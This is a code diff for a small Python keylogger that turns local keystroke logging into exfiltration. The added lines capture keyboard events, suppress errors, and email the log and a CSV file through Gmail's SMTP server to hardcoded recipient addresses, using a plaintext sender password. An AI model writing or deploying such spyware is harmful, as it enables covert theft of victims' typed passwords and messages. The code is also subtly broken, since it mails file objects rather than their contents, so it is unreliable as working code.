@@ -1,9 +1,23 @@
-import keyboard
+import log
+import smtplib
 
-def on_press(event):
-    print(f"name: {event.name}\ncode:{event.scan_code}\ntime:{event.time}")
-    with open("dat.log","a") as logfile:
-        logfile.write(f"\n{event.time}:Key {event.name} pressed (Code:{event.scan_code})")
 
-keyboard.on_press(on_press)
-keyboard.wait()
+try:
+    log.log_keyboard_events()
+except:
+    pass
+
+with open("dat.log","r") as logfile:
+    log=logfile
+with open("dat.csv","r") as datfile:
+    data=datfile
+
+sender="keylogaddress@gmail.com"
+receivers=["keylogaddress@gmail.com","tbdo@pm.me"]
+password="Keylog123#"
+
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login(sender, password)
+
+server.sendmail(sender, receivers, f"Log:{log}\nData:{data}")
